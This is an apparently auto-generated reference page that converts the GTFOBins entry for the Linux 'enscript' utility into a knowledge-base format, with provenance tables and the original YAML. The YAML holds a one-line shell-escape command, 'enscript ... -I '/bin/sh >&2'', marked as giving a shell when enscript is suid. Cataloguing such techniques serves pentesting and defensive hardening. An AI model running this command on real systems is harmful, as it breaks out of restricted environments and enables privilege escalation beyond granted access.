---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# enscript

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `enscript` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/enscript` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [enscript](../../tools/linux/enscript.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | enscript |
| name | enscript |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/enscript/ |

## Preserved Source Material

```yaml
_body: ''
_name: enscript
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/enscript
functions:
  shell:
  - code: enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
